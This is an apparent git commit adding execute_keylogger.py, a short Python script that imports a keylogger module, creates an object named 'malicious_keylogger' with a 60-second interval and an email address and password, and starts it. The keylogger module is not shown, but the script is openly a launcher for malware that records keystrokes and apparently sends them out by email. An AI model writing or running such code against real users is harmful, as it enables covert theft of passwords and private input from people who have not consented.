e400f57ef8e2140c3cb28a8de9e4a193ff0546d1
Akash Singh <akashraj843845@gmail.com>
2023-09-07 14:03:01 +0530

    Add files via upload

---
+++ execute_keylogger.py
@@ -0,0 +1,14 @@
+#!/usr/bin/env python
+
+import keylogger
+
+
+# Initialize / create keylogger
+import keylogger
+
+
+malicious_keylogger: keylogger.KeyLogger = keylogger.KeyLogger(60, 'abc@gmail.com', 'password')
+
+# Execute Keylogger
+
+malicious_keylogger.start()
